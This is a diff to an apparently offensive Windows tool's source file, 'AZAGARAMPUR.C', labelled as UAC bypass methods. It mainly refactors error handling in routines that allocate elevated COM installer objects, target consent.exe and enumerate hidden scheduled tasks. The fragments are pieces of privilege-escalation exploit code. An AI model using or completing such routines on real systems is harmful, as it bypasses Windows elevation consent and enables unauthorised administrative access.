@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2021
+*  (C) COPYRIGHT AUTHORS, 2020 - 2022
 *
 *  TITLE:       AZAGARAMPUR.C
 *
-*  VERSION:     3.58
+*  VERSION:     3.63
 *
-*  DATE:        01 Dec 2021
+*  DATE:        16 Jul 2022
 *
 *  UAC bypass methods from AzAgarampur.
 *
@@ -370,51 +370,39 @@ NTSTATUS ucmIeAddOnInstallMethod(
         //
         // VerifyFile required.
         //
-        r = CoInitializeSecurity(NULL,
-            -1,
-            NULL,
-            NULL,
-            RPC_C_AUTHN_LEVEL_CONNECT,
-            RPC_C_IMP_LEVEL_IMPERSONATE,
-            NULL,
-            0,
-            NULL);
-
-        if (FAILED(r)) {
-            break;
-        }
+        HRESULT_BREAK_ON_FAILED(
+            CoInitializeSecurity(NULL,
+                -1,
+                NULL,
+                NULL,
+                RPC_C_AUTHN_LEVEL_CONNECT,
+                RPC_C_IMP_LEVEL_IMPERSONATE,
+                NULL,
+                0,
+                NULL));
 
         //
         // Allocated elevated factory object.
         //
-        r = ucmAllocateElevatedObject(T_CLSID_IEAAddonInstaller,
-            &IID_IEAxiAdminInstaller,
-            CLSCTX_LOCAL_SERVER,
-            &BrokerObject);
+        HRESULT_BREAK_ON_FAILED(
+            ucmAllocateElevatedObject(T_CLSID_IEAAddonInstaller,
+                &IID_IEAxiAdminInstaller,
+                CLSCTX_LOCAL_SERVER,
+                &BrokerObject));
 
-        if (FAILED(r)) {
-            break;
-        }
-
-        r = BrokerObject->lpVtbl->InitializeAdminInstaller(BrokerObject,
-            NULL,
-            0,
-            &adminInstallerUuid);
-
-        if (FAILED(r)) {
-            break;
-        }
+        HRESULT_BREAK_ON_FAILED(
+            BrokerObject->lpVtbl->InitializeAdminInstaller(BrokerObject,
+                NULL,
+                0,
+                &adminInstallerUuid));
 
         //
         // Query install broker object.
         //
-        r = BrokerObject->lpVtbl->QueryInterface(BrokerObject,
-            &IID_IEAxiInstaller2,
-            &InstallBroker);
-
-        if (FAILED(r)) {
-            break;
-        }
+        HRESULT_BREAK_ON_FAILED(
+            BrokerObject->lpVtbl->QueryInterface(BrokerObject,
+                &IID_IEAxiInstaller2,
+                &InstallBroker));
 
         _strcpy(szDummyTarget, g_ctx->szSystemDirectory);
         _strcat(szDummyTarget, CONSENT_EXE);
@@ -447,9 +435,7 @@ NTSTATUS ucmIeAddOnInstallMethod(
             SysFreeString(fileToVerify);
         }
 
-        if (FAILED(r)) {
-            break;
-        }
+        HRESULT_BREAK_ON_FAILED(r);
 
         //
         // Kill file in cache
@@ -841,7 +827,6 @@ NTSTATUS ucmFwCplLuaMethod2(
             break;
 
         if (FwCplLua == NULL) {
-            r = E_OUTOFMEMORY;
             break;
         }
 
@@ -1436,7 +1421,7 @@ BOOL ucmxExamineTaskhost(
     ITaskService* pService = NULL;
     IRunningTaskCollection* pTasks = NULL;
     IRunningTask* pTask;
-    TASK_STATE taskState;
+    TASK_STATE taskState = TASK_STATE_UNKNOWN;
 
     do {
 
@@ -1446,8 +1431,7 @@ BOOL ucmxExamineTaskhost(
             &IID_ITaskService,
             (void**)&pService);
 
-        if (FAILED(hr))
-            break;
+        HRESULT_BREAK_ON_FAILED(hr);
 
         VariantInit(&varDummy);
 
@@ -1457,20 +1441,17 @@ BOOL ucmxExamineTaskhost(
             varDummy,
             varDummy);
 
-        if (FAILED(hr))
-            break;
+        HRESULT_BREAK_ON_FAILED(hr);
 
         hr = pService->lpVtbl->GetRunningTasks(pService,
             TASK_ENUM_HIDDEN,
             &pTasks);
 
-        if (FAILED(hr))
-            break;
+        HRESULT_BREAK_ON_FAILED(hr);
 
         hr = pTasks->lpVtbl->get_Count(pTasks, &cTasks);
 
-        if (FAILED(hr))
-            break;
+        HRESULT_BREAK_ON_FAILED(hr);
 
         varIndex.vt = VT_INT;
 
